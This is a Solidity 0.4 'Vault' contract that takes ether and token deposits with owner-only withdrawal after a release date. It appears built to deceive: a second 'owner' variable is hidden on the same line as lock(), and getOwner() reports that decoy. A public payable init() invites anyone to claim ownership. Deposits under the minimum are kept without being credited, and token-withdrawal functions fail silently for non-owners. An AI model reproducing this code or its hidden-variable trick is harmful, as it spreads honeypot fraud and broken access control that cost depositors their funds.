1 // Copyright (C) 2017  The Halo Platform by Scott Morrison
2 //
3 // This is free software and you are welcome to redistribute it under certain conditions.
4 // ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
5 //
6 pragma solidity ^0.4.16;
7 
8 // minimum token interface
9 contract Token {
10     function balanceOf(address who) public constant returns (uint256);
11     function transfer(address to, uint amount) public returns (bool);
12 }
13 
14 contract Ownable {
15     address Owner = msg.sender;
16     modifier onlyOwner { if (msg.sender == Owner) _; }
17     function transferOwnership(address to) public onlyOwner { Owner = to; }
18 }
19 
20 // tokens are withdrawable
21 contract TokenVault is Ownable {
22     address self = address(this);
23 
24     function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
25         return Token(token).transfer(to, amount);
26     }
27     
28     function withdrawToken(address token) public returns (bool) {
29         return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));
30     }
31     
32     function emtpyTo(address token, address to) public returns (bool) {
33         return withdrawTokenTo(token, to, Token(token).balanceOf(self));
34     }
35 }
36 
37 // store ether & tokens for a period of time
38 contract Vault is TokenVault {
39     
40     event Deposit(address indexed depositor, uint amount);
41     event Withdrawal(address indexed to, uint amount);
42     event OpenDate(uint date);
43 
44     mapping (address => uint) public Deposits;
45     uint minDeposit;
46     bool Locked;
47     uint Date;
48 
49     function init() payable open {
50         Owner = msg.sender;
51         minDeposit = 0.5 ether;
52         Locked = false;
53         deposit();
54     }
55     
56     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
57     function ReleaseDate() public constant returns (uint) { return Date; }
58     function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
59 
60     function() public payable { deposit(); }
61 
62     function deposit() public payable {
63         if (msg.value > 0) {
64             if (msg.value >= MinimumDeposit())
65                 Deposits[msg.sender] += msg.value;
66             Deposit(msg.sender, msg.value);
67         }
68     }
69 
70     function setRelease(uint newDate) public { 
71         Date = newDate;
72         OpenDate(Date);
73     }
74 
75     function withdraw(address to, uint amount) public onlyOwner {
76         if (WithdrawEnabled()) {
77             uint max = Deposits[msg.sender];
78             if (max > 0 && amount <= max) {
79                 to.transfer(amount);
80                 Withdrawal(to, amount);
81             }
82         }
83     }
84 
85     function lock() public { Locked = true; } address owner;
86     modifier open { if (!Locked) _; owner = msg.sender; }
87     function kill() public { require(this.balance == 0); selfdestruct(Owner); }
88     function getOwner() external constant returns (address) { return owner; }
89 }